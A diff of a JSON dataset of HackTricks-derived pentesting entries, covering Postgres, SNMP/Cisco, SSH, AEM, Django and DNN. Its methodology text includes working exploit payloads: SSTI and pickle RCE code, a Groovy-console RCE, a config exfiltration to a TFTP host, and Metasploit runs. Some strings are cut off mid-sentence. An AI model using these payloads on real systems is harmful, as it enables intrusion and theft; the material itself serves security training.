abnormally \n\n## Roles\n| Role Types     |                                                                                                                                                      |\n| -------------- | ---------------------------------------------------------------------------------------------------------------------------------------------------- |\n| rolsuper       | Role has superuser privileges                                                                                                                        |\n| rolinherit     | Role automatically inherits privileges of roles it is a member of                                                                                    |\n| rolcreaterole  | Role can create more roles                                                                                                                           |\n| rolcreatedb    | Role can create databases                                                                                                          \n\n## Interesting Groups\n- If you are a member of **`pg_execute_server_program`** you can **execute** programs\n- If you are a member of **`pg_read_server_files`** you can **read** files\n- If you are a member of **`pg_write_server_files`** you can **write** files\n\n> [!TIP]\n> Note that in Postgres a **user**, a **group** and a **role** is the **same**. It just depend on **how you use it** and if you **allow it to login**.\n\n```sql\n\n## r.rolconfig,\nSELECT\n      r.rolname,\n      r.rolsuper,\n      r.rolinherit,\n      r.rolcreaterole,\n      r.rolcreatedb,\n      r.rolcanlogin,\n      r.rolbypassrls,\n      r.rolconnlimit,\n      r.rolvaliduntil,\n      r.oid,\n  ARRAY(SELECT b.rolname\n        FROM pg_catalog.pg_auth_members m\n        JOIN pg_catalog.pg_roles b ON (m.roleid = b.oid)\n        WHERE m.member = r.oid) as memberof\n, r.rolreplication\nFROM pg_catalog.pg_roles r\nORDER BY 1;\n\n## For doing this you need to be admin on the role, superadmin or have CREATEROLE role (see next section)\nGRANT pg_execute_server_program TO \"username\";\nGRANT pg_read_server_files TO \"username\";\nGRANT pg_write_server_files TO \"username\";",
@@ -11981,13 +11981,13 @@
   "kill_chain_phase": "ENUMERATION",
   "source": "hacktricks",
   "tags": [
-   "auxiliary/scanner/postgres/postgres_hashdump",
-   "auxiliary/scanner/postgres/postgres_dbname_flag_injection",
-   "exploit/linux/postgres/postgres_payload",
-   "exploit/windows/postgres/postgres_payload",
+   "0",
+   "auxiliary/scanner/postgres/postgres_schemadump",
    "auxiliary/admin/postgres/postgres_readfile",
    "pentesting postgresql",
-   "0"
+   "exploit/linux/postgres/postgres_payload",
+   "auxiliary/scanner/postgres/postgres_hashdump",
+   "auxiliary/scanner/postgres/postgres_version"
   ]
  },
  {
@@ -12139,8 +12139,8 @@
   "kill_chain_phase": "ENUMERATION",
   "source": "hacktricks",
   "tags": [
-   "pentesting rdp",
-   "0"
+   "0",
+   "pentesting rdp"
   ]
  },
  {
@@ -12208,8 +12208,8 @@
   "kill_chain_phase": "EXPLOITATION",
   "source": "hacktricks",
   "tags": [
-   "pentesting rlogin",
-   "0"
+   "0",
+   "pentesting rlogin"
   ]
  },
  {
@@ -12348,8 +12348,8 @@
   "kill_chain_phase": "ENUMERATION",
   "source": "hacktricks",
   "tags": [
-   "pentesting rpcbind",
-   "0"
+   "0",
+   "pentesting rpcbind"
   ]
  },
  {
@@ -12593,13 +12593,13 @@
   "kill_chain_phase": "RECON",
   "source": "hacktricks",
   "tags": [
+   "exploit/windows/http/sap_configservlet_exec_noauth",
+   "0",
+   "auxiliary/scanner/sap/sap_soap_rfc_eps_get_directory_listing",
    "exploit/multi/sap/sap_soap_rfc_sxpg_call_system_exec",
-   "pentesting sap",
-   "auxiliary/scanner/sap/sap_mgmt_con_brute_login",
-   "auxiliary/scanner/sap/sap_mgmt_con_instanceproperties",
-   "auxiliary/scanner/sap/sap_mgmt_con_getaccesspoints",
-   "auxiliary/scanner/sap/sap_soap_bapi_user_create1",
-   "0"
+   "auxiliary/scanner/sap/sap_soap_rfc_brute_login",
+   "auxiliary/scanner/sap/sap_mgmt_con_version",
+   "pentesting sap"
   ]
  },
  {
@@ -12925,12 +12925,12 @@
   "kill_chain_phase": "ENUMERATION",
   "source": "hacktricks",
   "tags": [
-   "readme",
-   "auxiliary/scanner/smb/smb_version**`",
-   "auxiliary/scanner/smb/smb_lookupsid",
+   "0",
    "auxiliary/scanner/smb/smb_version;",
+   "auxiliary/scanner/smb/smb_lookupsid",
    "auxiliary/scanner/smb/smb2;",
-   "0"
+   "readme",
+   "auxiliary/scanner/smb/smb_version**`"
   ]
  },
  {
@@ -13082,8 +13082,8 @@
   "kill_chain_phase": "ENUMERATION",
   "source": "hacktricks",
   "tags": [
-   "rpcclient enumeration",
-   "0"
+   "0",
+   "rpcclient enumeration"
   ]
  },
  {
@@ -13400,12 +13400,12 @@
   "kill_chain_phase": "ENUMERATION",
   "source": "hacktricks",
   "tags": [
-   "readme",
-   "auxiliary/scanner/smtp/smtp_version;",
    "auxiliary/scanner/smtp/smtp_enum",
+   "0",
+   "auxiliary/scanner/smtp/smtp_version;",
+   "readme",
    "auxiliary/scanner/smtp/smtp_ntlm_domain;",
-   "auxiliary/scanner/smtp/smtp_relay;",
-   "0"
+   "auxiliary/scanner/smtp/smtp_relay;"
   ]
  },
  {
@@ -13424,8 +13424,8 @@
   "kill_chain_phase": "EXPLOITATION",
   "source": "hacktricks",
   "tags": [
-   "smtp commands",
-   "0"
+   "0",
+   "smtp commands"
   ]
  },
  {
@@ -13566,8 +13566,8 @@
   "kill_chain_phase": "ENUMERATION",
   "source": "hacktricks",
   "tags": [
-   "smtp smuggling",
-   "0"
+   "0",
+   "smtp smuggling"
   ]
  },
  {
@@ -13821,8 +13821,8 @@
   "exploitation_commands": [],
   "default_credentials": [],
   "common_vulnerabilities": [
-   "CVE-2025-20174",
-   "CVE-2024-20373"
+   "CVE-2024-20373",
+   "CVE-2025-20174"
   ],
   "privilege_escalation": [],
   "methodology": "## Pentesting Cisco Networks\n**SNMP** functions over UDP with ports **161/UDP** for general messages and **162/UDP** for trap messages. This protocol relies on *community strings*, serving as plaintext \"passwords\" that enable communication between SNMP agents and managers. These strings determine the access level, specifically **read-only (RO) or read-write (RW) permissions**.\n\nA classic—yet still extremely effective—attack vector is to **brute-force community strings** in order to elevate from unauthenticated user to device administrator (RW community).  \nA practical tool for this task is [**onesixtyone**](https://github.com/trailofbits/onesixtyone):\n\n```bash\nonesixtyone -c community_strings.txt -i targets.txt\n```\n\nOther fast options are the Nmap NSE script `snmp-brute` or Hydra's SNMP module:\n\n```bash\nnmap -sU -p161 --script snmp-brute --script-args brute.community=wordlist 10.0.0.0/24\nhydra -P wordlist.txt -s 161 10.10.10.1 snmp\n```\n\n---\n\n## Dumping configuration through SNMP (CISCO-CONFIG-COPY-MIB)\nIf you obtain an **RW community** you can copy the running-config/startup-config to a TFTP/FTP server *without CLI access* by abusing the CISCO-CONFIG-COPY-MIB (`1.3.6.1.4.1.9.9.96`). Two common approaches are:\n\n1. **Nmap NSE – `snmp-ios-config`**\n\n```bash\nnmap -sU -p161 --script snmp-ios-config \\\n     --script-args creds.snmp=private 192.168.66.1\n```\nThe script automatically orchestrates the copy operation and prints the configuration to stdout   .\n\n2. **Manual `snmpset` sequence**\n\n```bash\n\n## Copy running-config (4) to a TFTP server (1) – random row id 1234\nsnmpset -v2c -c private 192.168.66.1 \\\n  1.3.6.1.4.1.9.9.96.1.1.1.1.2.1234 i 1 \\    # protocol = tftp\n  1.3.6.1.4.1.9.9.96.1.1.1.1.3.1234 i 4 \\    # sourceFileType = runningConfig\n  1.3.6.1.4.1.9.9.96.1.1.1.1.4.1234 i 1 \\    # destFileType   = networkFile\n  1.3.6.1.4.1.9.9.96.1.1.1.1.5.1234 a 10.10.14.8 \\ # TFTP server IP\n  1.3.6.1.4.1.9.9.96.1.1.1.1.6.1234 s \\\"backup.cfg\\\" \\\\\n  1.3.6.1.4.1.9.9.96.1.1.1.1.14.1234 i 4       # rowStatus = createAndGo\n```\nRow identifiers are *one-shot*; reuse within five minutes triggers `inconsistentValue` errors.  \n\nOnce the file is on your TFTP server you can inspect credentials (`enable secret`, `username <user> secret`, etc.) or even push a modified config back to the device.\n\n---\n\n## Metasploit goodies\n* **`cisco_config_tftp`** – downloads running-config/startup-config via TFTP after abusing the same MIB.\n* **`snmp_enum`** – collects device inventory information, VLANs, interface descriptions, ARP tables, etc.\n\n```bash\nuse auxiliary/scanner/snmp/snmp_enum\nset RHOSTS 10.10.100.10\nset COMMUNITY public\nrun\n```\n\n---\n\n## Recent Cisco SNMP vulnerabilities (2023 – 2025)\nKeeping track of vendor advisories is useful to scope *zero-day-to-n-day* opportunities inside an engagement:\n\n| Year | CVE | Affected feature | Impact |\n|------|-----|-----------------|--------|\n| 2025 | CVE-2025-20174 | SNMP subsystem | Crafted packet leads to authenticated *DoS* (reload) on IOS/IOS-XE (v1/v2c/v3).   |\n| 2024 | CVE-2024-20373 | IPv4 ACL handling | Mis-configured **extended** ACLs silently *fail*, allowing unauthenticated SNMP polling when a valid community/user is known.   |\n| 2025 | (no CVE yet) | SNMPv3 configuration restriction bypass | Valid v3 user can poll from addresses that should be denied.   |\n\nExploitability often still depends on possessing the community string or v3 credentials—another reason why brute-forcing them remains relevant.\n\n---\n\n## Hardening & Detection tips\n* Upgrade to a fixed IOS/IOS-XE version (see Cisco advisory for the CVE above).\n* Prefer **SNMPv3** with `authPriv` (SHA-256/AES-256) over v1/v2c.  \n  ```\n  snmp-server group SECURE v3 priv\n  snmp-server user monitor SECURE v3 auth sha <authpass> priv aes 256 <privpass>\n  ```\n* Bind SNMP to a management VRF and **restrict with *standard* numbered IPv4 ACLs** (extended named ACLs are risky – CVE-2024-20373).\n* Disable **RW communities**; if operationally required, limit them with ACL and views:  \n  `snmp-server community <string> RW 99  view SysView`\n* Monitor for:\n  - UDP/161 spikes or unexpected sources (SIEM rules).\n  - `CISCO-CONFIG-MAN-MIB::ccmHistoryEventConfigSource` events indicating out-of-band config changes.\n* Enable **SNMPv3 logging** and `snmp-server packetsize 1500` to reduce certain DoS vectors.\n\n---\n\n## References\n- Cisco: *How To Copy Configurations To and From Cisco Devices Using SNMP*  \n- Cisco Security Advisory *cisco-sa-snmp-uwBXfqww* (CVE-2024-20373)  \n\n{{#include ../../banners/hacktricks-training.md}}",
@@ -13830,9 +13830,9 @@
   "kill_chain_phase": "ENUMERATION",
   "source": "hacktricks",
   "tags": [
-   "cisco snmp",
+   "0",
    "auxiliary/scanner/snmp/snmp_enum",
-   "0"
+   "cisco snmp"
   ]
  },
  {
@@ -13904,8 +13904,8 @@
   "kill_chain_phase": "ENUMERATION",
   "source": "hacktricks",
   "tags": [
-   "snmp rce",
-   "0"
+   "0",
+   "snmp rce"
   ]
  },
  {
@@ -14190,13 +14190,13 @@
    }
   ],
   "common_vulnerabilities": [
+   "CVE-2024-6387",
+   "CVE-2024-3094",
+   "cve-2025-32433",
    "CVE-2018-10933",
    "cve-2024-3094",
    "CVE-2006-5051",
-   "CVE-2025-32433",
-   "CVE-2024-6387",
-   "cve-2025-32433",
-   "CVE-2024-3094"
+   "CVE-2025-32433"
   ],
   "privilege_escalation": [],
   "methodology": "## Basic Information\n**SSH (Secure Shell or Secure Socket Shell)** is a network protocol that enables a secure connection to a computer over an unsecured network. It is essential for maintaining the confidentiality and integrity of data when accessing remote systems.\n\n**Default port:** 22\n\n```\n22/tcp open  ssh     syn-ack\n```\n\n**SSH servers:**\n\n- [openSSH](http://www.openssh.org) – OpenBSD SSH, shipped in BSD, Linux distributions and Windows since Windows 10\n- [Dropbear](https://matt.ucc.asn.au/dropbear/dropbear.html) – SSH implementation for environments with low memory and processor resources, shipped in OpenWrt\n- [PuTTY](https://www.chiark.greenend.org.uk/~sgtatham/putty/) – SSH implementation for Windows, the client is commonly used but the use of the server is rarer\n- [CopSSH](https://www.itefix.net/copssh) – implementation of OpenSSH for Windows\n\n**SSH libraries (implementing server-side):**\n\n- [libssh](https://www.libssh.org) – multiplatform C library implementing the SSHv2 protocol with bindings in\n\n## Automated ssh-audit\nssh-audit is a tool for ssh server & client configuration auditing.\n\n[https://github.com/jtesta/ssh-audit](https://github.com/jtesta/ssh-audit) is an updated fork from [https://github.com/arthepsy/ssh-audit/](https://github.com/arthepsy/ssh-audit/)\n\n**Features:**\n\n- SSH1 and SSH2 protocol server support;\n- analyze SSH client configuration;\n- grab banner, recognize device or software and operating system, detect compression;\n- gather key-exchange, host-key, encryption and message authentication code algorithms;\n- output algorithm information (available since, removed/disabled, unsafe/weak/legacy, etc);\n- output algorithm recommendations (append or remove based on recognized software version);\n- output security information (related issues, assigned CVE list, etc);\n- analyze SSH version compatibility based on algorithm information;\n- historical information from OpenSSH, Dropbear SSH and libssh;\n- runs on Linux and Windows;\n- no dependencies\n\n```bash\nusage: ssh-audit.py [-1246pbcnjvlt] <ho\n\n## Weak Cipher Algorithms\nThis is discovered by default by **nmap**. But you can also use **sslcan** or **sslyze**.\n\n## Nmap scripts\n```bash\nnmap -p22 <ip> -sC # Send default nmap scripts for SSH\nnmap -p22 <ip> -sV # Retrieve version\nnmap -p22 <ip> --script ssh2-enum-algos # Retrieve supported algorythms\nnmap -p22 <ip> --script ssh-hostkey --script-args ssh_hostkey=full # Retrieve weak keys\nnmap -p22 <ip> --script ssh-auth-methods --script-args=\"ssh.user=root\" # Check authentication methods\n```\n\n## Username Enumeration\nIn some versions of OpenSSH you can make a timing attack to enumerate users. You can use a metasploit module in order to exploit this:\n\n```\nmsf> use scanner/ssh/ssh_enumusers\n```\n\n## [Brute force](../generic-hacking/brute-force.md#ssh)\nSome common ssh credentials [here ](https://github.com/danielmiessler/SecLists/blob/master/Passwords/Default-Credentials/ssh-betterdefaultpasslist.txt)and [here](https://github.com/danielmiessler/SecLists/blob/master/Passwords/Common-Credentials/top-20-common-SSH-passwords.txt) and below.\n\n## Private Key Brute Force\nIf you know some ssh private keys that could be used... let's try it. You can use the nmap script:\n\n```\nhttps://nmap.org/nsedoc/scripts/ssh-publickey-acceptance.html\n```\n\nOr the MSF auxiliary module:\n\n```\nmsf> use scanner/ssh/ssh_identify_pubkeys\n```\n\nOr use `ssh-keybrute.py` (native python3, lightweight and has legacy algorithms enabled): [snowdroppe/ssh-keybrute](https://github.com/snowdroppe/ssh-keybrute).\n\n## Known badkeys can be found here:\n{{#ref}}\nhttps://github.com/rapid7/ssh-badkeys/tree/master/authorized\n{{#endref}}\n\n## Weak SSH keys / Debian predictable PRNG\nSome systems have known flaws in the random seed used to generate cryptographic material. This can result in a dramatically reduced keyspace which can be bruteforced. Pre-generated sets of keys generated on Debian systems affected by weak PRNG are available here: [g0tmi1k/debian-ssh](https://github.com/g0tmi1k/debian-ssh).\n\nYou should look here in order to search for valid keys for the victim machine.\n\n## Kerberos / GSSAPI SSO\nIf the target SSH server supports GSSAPI (for example Windows OpenSSH on a domain controller), you can authenticate using your Kerberos TGT instead of a password.\n\nWorkflow from a Linux attacker host:\n\n```bash",
@@ -14206,9 +14206,9 @@
   "tags": [
    "pentesting ssh",
    "auxiliary/fuzzers/ssh/ssh_version_2](https://www.rapid7.com/db/modules/auxiliary/fuzzers/ssh/ssh_version_2)",
-   "auxiliary/scanner/ssh/juniper_backdoor;",
+   "0",
    "auxiliary/scanner/ssh/ssh_version;",
-   "0"
+   "auxiliary/scanner/ssh/juniper_backdoor;"
   ]
  },
  {
@@ -14370,10 +14370,10 @@
   "exploitation_commands": [],
   "default_credentials": [],
   "common_vulnerabilities": [
-   "CVE-2023-40478",
-   "CVE-2024-45698",
    "cve-2026-24061",
+   "CVE-2023-40478",
    "CVE-2026-24061",
+   "CVE-2024-45698",
    "CVE-2022-39028"
   ],
   "privilege_escalation": [],
@@ -14382,13 +14382,13 @@
   "kill_chain_phase": "ENUMERATION",
   "source": "hacktricks",
   "tags": [
-   "auxiliary/scanner/telnet/telnet_encrypt_overflow;",
-   "pentesting telnet",
-   "auxiliary/scanner/telnet/telnet_version;",
    "auxiliary/scanner/telnet/brute_telnet`",
+   "pentesting telnet",
+   "0",
+   "exploit/linux/mips/netgear_telnetenable`",
    "auxiliary/scanner/telnet/telnet_encrypt_overflow`",
-   "auxiliary/scanner/telnet/telnet_version`",
-   "0"
+   "auxiliary/scanner/telnet/telnet_version;",
+   "auxiliary/scanner/telnet/brocade_enable_login;"
   ]
  },
  {
@@ -14447,9 +14447,9 @@
   "kill_chain_phase": "ENUMERATION",
   "source": "hacktricks",
   "tags": [
+   "0",
    "auxiliary/scanner/vnc/vnc_none_auth",
-   "pentesting vnc",
-   "0"
+   "pentesting vnc"
   ]
  },
  {
@@ -14806,11 +14806,11 @@
   "source": "hacktricks",
   "tags": [
    "auxiliary/scanner/sip/options_tcp",
-   "readme",
-   "auxiliary/scanner/sip/enumerator",
+   "0",
    "auxiliary/scanner/sip/enumerator_tcp",
-   "auxiliary/scanner/sip/options",
-   "0"
+   "auxiliary/scanner/sip/enumerator",
+   "readme",
+   "auxiliary/scanner/sip/options"
   ]
  },
  {
@@ -15023,8 +15023,8 @@
   "kill_chain_phase": "ENUMERATION",
   "source": "hacktricks",
   "tags": [
-   "sip session initiation protocol",
-   "0"
+   "0",
+   "sip session initiation protocol"
   ]
  },
  {
@@ -15188,11 +15188,11 @@
   "exploitation_commands": [],
   "default_credentials": [],
   "common_vulnerabilities": [
-   "CVE-2025-64537",
-   "CVE-2025-54254",
    "CVE-2025-54253",
    "CVE-2024-53962",
-   "CVE-2016-7882"
+   "CVE-2016-7882",
+   "CVE-2025-64537",
+   "CVE-2025-54254"
   ],
   "privilege_escalation": [],
   "methodology": "## AEM (Adobe Experience Manager) Pentesting\n{{#include ../../banners/hacktricks-training.md}}\n\n> Adobe Experience Manager (AEM, part of the Adobe Experience Cloud) is an enterprise CMS that runs on top of Apache Sling/Felix (OSGi) and a Java Content Repository (JCR).  \n> From an attacker perspective AEM instances very often expose dangerous development endpoints, weak Dispatcher rules, default credentials and a long tail of CVEs that are patched every quarter.\n\nThe checklist below focuses on **externally reachable (unauth) attack surface** that keeps showing up in real engagements (2022-2026).\n\n---\n\n## 1. Fingerprinting\n```\n$ curl -s -I https://target | egrep -i \"aem|sling|cq\"\nX-Content-Type-Options: nosniff\nX-Dispatcher: hu1            # header added by AEM Dispatcher\nX-Vary: Accept-Encoding\n```\n\nOther quick indicators:\n* `/etc.clientlibs/` static path present (returns JS/CSS).  \n* `/libs/granite/core/content/login.html` login page with the “Adobe Experience Manager” banner.  \n* `</script><!--/* CQ */-->` comment at the bottom of HTML.\n\n---\n\n## 2. High-value unauthenticated endpoints\nPath | What you get | Notes\n---- | ------------- | -----\n`/.json`, `/.1.json` | JCR nodes via **DefaultGetServlet** | Often blocked, but *Dispatcher bypass* (see below) works.\n`/bin/querybuilder.json?path=/` | QueryBuilder API | Leak of page tree, internal paths, user names.\n`/system/console/status-*`, `/system/console/bundles` | OSGi/Felix console | 403 by default; if exposed & creds found ⇒ bundle-upload RCE.\n`/crx/packmgr/index.jsp` | Package Manager | Allows authenticated content packages → JSP payload upload.\n`/etc/groovyconsole/**` | AEM Groovy Console | If exposed → arbitrary Groovy / Java execution.\n`/libs/cq/AuditlogSearchServlet.json` | Audit logs | Information disclosure.\n`/libs/cq/ui/content/dumplibs.html` | ClientLibs dump | XSS vector.\n`/adminui/debug` | **AEM Forms on JEE** Struts dev-mode OGNL evaluator | On misconfigured Forms installs (CVE-2025-54253) this endpoint executes unauthenticated OGNL → RCE.\n\n## Dispatcher bypass tricks (still working in 2025/2026)\nMost production sites sit behind the *Dispatcher* (reverse-proxy). Filter rules are frequently bypassed by abusing encoded characters or allowed static extensions.\n\n*Classic semicolon + allowed extension*\n```\nGET /bin/querybuilder.json;%0aa.css?path=/home&type=rep:User HTTP/1.1\n```\n\n*Encoded slash bypass (2025 KB ka-27832)*\n```\nGET /%2fbin%2fquerybuilder.json?path=/etc&1_property=jcr:primaryType HTTP/1.1\n```\nIf the Dispatcher allows encoded slashes, this returns JSON even when `/bin` is supposedly denied.\n\n---\n\n## 3. Common misconfigurations (still alive in 2026)\n1. **Anonymous POST servlet** – `POST /.json` with `:operation=import` lets you plant new JCR nodes. Blocking `*.json` POST in the Dispatcher fixes it.\n2. **World-readable user profiles** – default ACL grants `jcr:read` on `/home/users/**/profile/*` to everyone.\n3. **Default credentials** – `admin:admin`, `author:author`, `replication:replication`.\n4. **WCMDebugFilter** enabled ⇒ reflected XSS via `?debug=layout` (CVE-2016-7882, still found on legacy 6.4 installs).\n5. **Groovy Console exposed** – remote code execution by sending a Groovy script:\n   ```bash\n   curl -u admin:admin -d 'script=println \"pwn\".execute()' https://target/bin/groovyconsole/post.json\n   ```\n6. **Dispatcher encoded-slash gap** – `/bin/querybuilder.json` and `/etc/truststore.json` reachable with `%2f`/`%3B` even when blocked by path filters.\n7. **AEM Forms Struts devMode left enabled** – `/adminui/debug?expression=` evaluates OGNL without auth (CVE-2025-54253) leading to unauth RCE; paired XXE in Forms submission (\n\n## 4. Recent vulnerabilities (service-pack cadence)\nQuarter | CVE / Bulletin | Affected | Impact\n------- | --- | -------- | ------\nDec 2025 | **APSB25-115**, CVE-2025-64537/64539 | 6.5.24 & earlier, Cloud 2025.12 | Multiple critical/stored XSS → code execution via author UI.\nSep 2025 | APSB25-90 | 6.5.23 & earlier | Security feature bypass chain (Dispatcher auth checker) – upgrade to 6.5.24/Cloud 2025.12.\nAug 2025 | **CVE-2025-54253 / 54254** (AEM Forms JEE) | Forms 6.5.23.0 and earlier | DevMode OGNL RCE + XXE file read, unauthenticated.\nJun 2025 | APSB25-48 | 6.5.23 & earlier | Stored XSS and privilege escalation in Communities components.\nDec 2024 | APSB24-69 (rev. Mar 2025 adds CVE-2024-53962…74) | 6.5.22 & earlier | DOM/Stored XSS, arbitrary code exec (low-priv).\nDec 2023 | APSB23-72 | ≤ 6.5.18 | DOM-based XSS via crafted URL.\n\nAlways check the *APSB* bulletin matching the customer’s service-pack and push for the latest **6.5.24 (Nov 26, 2025)** or **Cloud Service 2025.12**. AEM Forms on JEE requires its own add-on hotfix **6.5.0-0\n\n## 1. Create a node that will become /content/evil.jsp\nPOST /content/evil.jsp;%0aa.css HTTP/1.1\nContent-Type: application/x-www-form-urlencoded\n\n:contentType=text/plain\njcr:data=<% out.println(\"pwned\"); %>\n:operation=import\n```\nNow request `/content/evil.jsp` – the JSP runs with ",
@@ -15200,8 +15200,8 @@
   "kill_chain_phase": "ENUMERATION",
   "source": "hacktricks",
   "tags": [
-   "aem adobe experience cloud",
-   "0"
+   "0",
+   "aem adobe experience cloud"
   ]
  },
  {
@@ -15301,13 +15301,13 @@
   "kill_chain_phase": "EXPLOITATION",
   "source": "hacktricks",
   "tags": [
+   "0",
    "post/angular-security-checklist)",
    "post/angular-security-the-definitive-guide-part-1)",
-   "post/angular-security-the-definitive-guide-part-2)",
    "post/angular-security-checklist).",
    "post/angular-security-the-definitive-guide-part-3)",
-   "angular",
-   "0"
+   "post/angular-security-the-definitive-guide-part-2)",
+   "angular"
   ]
  },
  {
@@ -15505,8 +15505,8 @@
   "kill_chain_phase": "EXPLOITATION",
   "source": "hacktricks",
   "tags": [
-   "apache",
-   "0"
+   "0",
+   "apache"
   ]
  },
  {
@@ -15545,8 +15545,8 @@
   "kill_chain_phase": "EXPLOITATION",
   "source": "hacktricks",
   "tags": [
-   "bolt cms",
-   "0"
+   "0",
+   "bolt cms"
   ]
  },
  {
@@ -15585,8 +15585,8 @@
   "kill_chain_phase": "GENERAL",
   "source": "hacktricks",
   "tags": [
-   "firebase database",
-   "0"
+   "0",
+   "firebase database"
   ]
  },
  {
@@ -15654,8 +15654,8 @@
   ],
   "default_credentials": [],
   "common_vulnerabilities": [
-   "cve-2012-2311",
    "CVE-2012-2311",
+   "cve-2012-2311",
    "CVE-2012-1823",
    "cve-2012-1823"
   ],
@@ -15665,8 +15665,8 @@
   "kill_chain_phase": "ENUMERATION",
   "source": "hacktricks",
   "tags": [
-   "cgi",
-   "0"
+   "0",
+   "cgi"
   ]
  },
  {
@@ -15826,8 +15826,8 @@
   "kill_chain_phase": "ENUMERATION",
   "source": "hacktricks",
   "tags": [
-   "custom protocols",
-   "0"
+   "0",
+   "custom protocols"
   ]
  },
  {
@@ -15930,10 +15930,10 @@
   ],
   "default_credentials": [],
   "common_vulnerabilities": [
+   "cve-2023-33733",
    "CVE-2023-33733",
-   "CVE-2025-48432",
    "CVE-2024-42005",
-   "cve-2023-33733"
+   "CVE-2025-48432"
   ],
   "privilege_escalation": [],
   "methodology": "## Cache Manipulation to RCE\nDjango's default cache storage method is [Python pickles](https://docs.python.org/3/library/pickle.html), which can lead to RCE if [untrusted input is unpickled](https://media.blackhat.com/bh-us-11/Slaviero/BH_US_11_Slaviero_Sour_Pickles_Slides.pdf). **If an attacker can gain write access to the cache, they can escalate this vulnerability to RCE on the underlying server**.\n\nDjango cache is stored in one of four places: [Redis](https://github.com/django/django/blob/48a1929ca050f1333927860ff561f6371706968a/django/core/cache/backends/redis.py#L12), [memory](https://github.com/django/django/blob/48a1929ca050f1333927860ff561f6371706968a/django/core/cache/backends/locmem.py#L16), [files](https://github.com/django/django/blob/48a1929ca050f1333927860ff561f6371706968a/django/core/cache/backends/filebased.py#L16), or a [database](https://github.com/django/django/blob/48a1929ca050f1333927860ff561f6371706968a/django/core/cache/backends/db.py#L95). Cache stored in a Redis server or database are the\n\n## Server-Side Template Injection (SSTI)\nThe Django Template Language (DTL) is **Turing-complete**. If user-supplied data is rendered as a *template string* (for example by calling `Template(user_input).render()` or when `|safe`/`format_html()` removes auto-escaping), an attacker may achieve full SSTI → RCE.\n\n## Detection\n1. Look for dynamic calls to `Template()` / `Engine.from_string()` / `render_to_string()` that include *any* unsanitised request data.\n2. Send a time-based or arithmetic payload:\n   ```django\n   {{7*7}}\n   ```\n   If the rendered output contains `49` the input is compiled by the template engine.\n3. DTL is **not Jinja2**: arithmetic/loop payloads regularly raise `TemplateSyntaxError`/500 while still proving evaluation. Polyglots like `${{<%[%'\"}}%` are good crash-or-render probes.\n\n## Context exfiltration when RCE is blocked\nEven if object-walking to `subprocess.Popen` fails, DTL still exposes in-scope objects:\n```django\n{{ request }}               {# confirm SSTI #}\n{{ request.META }}           {# leak Gunicorn/UWSGI headers, cookies, proxy info #}\n{{ users }}                  {# QuerySet in the context? #}\n{{ users.0 }}                {# first row #}\n{{ users.values }}           {# dumps dicts of every column (email/flags/plaintext passwords if stored) #}\n```\n`QuerySet.values()` coerces rows to dictionaries, bypassing `__str__` and exposing all fields returned by the queryset. This works even when direct Python execution is filtered.\n\n**Automation pattern**: authenticate, grab the CSRF token, save a marker-prefixed payload in any persistent field (e.g., username/profile bio), then request a view that renders it (AJAX endpoints like `/likes/<id>` are common). Parse a stable attribute (e.g., `title=\"...\"`) to recover the rendered result and iterate payloads.\n\n## Primitive to RCE\nDjango blocks direct access to `__import__`, but the Python object graph is reachable:\n```django\n{{''.__class__.mro()[1].__subclasses__()}}\n```\nFind the index of `subprocess.Popen` (≈400–500 depending on Python build) and execute arbitrary commands:\n```django\n{{''.__class__.mro()[1].__subclasses__()[438]('id',shell=True,stdout=-1).communicate()[0]}}\n```\nA safer universal gadget is to iterate until `cls.__name__ == 'Popen'`.\n\nThe same gadget works for **Debug Toolbar** or **Django-CMS** template rendering features that mishandle user input.\n\n---\n\n## Also see: ReportLab/xhtml2pdf PDF export RCE\nApplications built on Django commonly integrate xhtml2pdf/ReportLab to export views as PDF. When user-controlled HTML flows into PDF generation, rl_safe_eval may evaluate expressions inside triple brackets `[[[ ... ]]]` enabling code execution (CVE-2023-33733). Details, payloads, and mitigations:\n\n{{#ref}}\n../../generic-methodologies-and-resources/python/bypass-python-sandboxes/reportlab-xhtml2pdf-triple-brackets-expression-evaluation-rce-cve-2023-33733.md\n{{#endref}}\n\n---\n\n## Pickle-Backed Session Cookie RCE\nIf the setting `SESSION_SERIALIZER = 'django.contrib.sessions.serializers.PickleSerializer'` is enabled (or a custom serializer that deserialises pickle), Django *decrypts and unpickles* the session cookie **before** calling any view code. Therefore, possessing a valid signing key (the project `SECRET_KEY` by default) is enough for immediate remote code execution.\n\n## Exploit Requirements\n* The server uses `PickleSerializer`.\n* The attacker knows / can guess `settings.SECRET_KEY` (leaks via GitHub, `.env`, error pages, etc.).\n\n## Proof-of-Concept\n```python\n#!/usr/bin/env python3\nfrom django.contrib.sessions.serializers import PickleSerializer\nfrom django.core import signing\nimport os, base64\n\nclass RCE(object):\n    def __reduce__(self):\n        return (os.system, (\"id > /tmp/pwned\",))\n\nmal = signing.dumps(RCE(), key=b'SECRET_KEY_HERE', serializer=PickleSerializer)\nprint(f\"sessionid={mal}\")\n```\nSend the resulting cookie, and the payload runs with the permissions of the WSGI worker.\n\n**Mitigations**: Keep the defau",
@@ -16014,10 +16014,10 @@
   "default_credentials": [],
   "common_vulnerabilities": [
    "CVE-2025-52488",
-   "CVE-2018-15811",
+   "CVE-2017-9822",
    "CVE-2025-52487",
-   "CVE-2025-32372",
-   "CVE-2017-9822"
+   "CVE-2018-15811",
+   "CVE-2025-32372"
   ],
   "privilege_escalation": [],
   "methodology": "## DotNetNuke (DNN)\nIf you enter as **administrator** in DNN it's easy to obtain **RCE**, however a number of *unauthenticated* and *post-auth* techniques have been published in the last few years.  The following cheat-sheet collects the most useful primitives for both offensive and defensive work.\n\n---\n\n## Version & Environment Enumeration\n* Check the *X-DNN* HTTP response header – it usually discloses the exact platform version.\n* The installation wizard leaks the version in `/Install/Install.aspx?mode=install` (accessible on very old installs).\n* `/API/PersonaBar/GetStatus` (9.x) returns a JSON blob containing `\"dnnVersion\"` for low-privilege users.\n* Typical cookies you will see on a live instance:\n  * `.DOTNETNUKE` – ASP.NET forms authentication ticket.\n  * `DNNPersonalization` – contains XML/serialized user profile data (old versions – see RCE below).\n\n---\n\n## 1. Cookie Deserialization RCE  (CVE-2017-9822 & follow-ups)\n*Affected versions ≤ 9.3.0-RC*\n\n`DNNPersonalization` is deserialized on every request when the built-in 404 handler is enabled.  Crafted XML can therefore lead to arbitrary gadget chains and code execution.\n\n```\nmsf> use exploit/windows/http/dnn_cookie_deserialization_rce\nmsf> set RHOSTS <target>\nmsf> set LHOST  <attacker_ip>\nmsf> run\n```\nThe module automatically chooses the right path for patched but still vulnerable versions 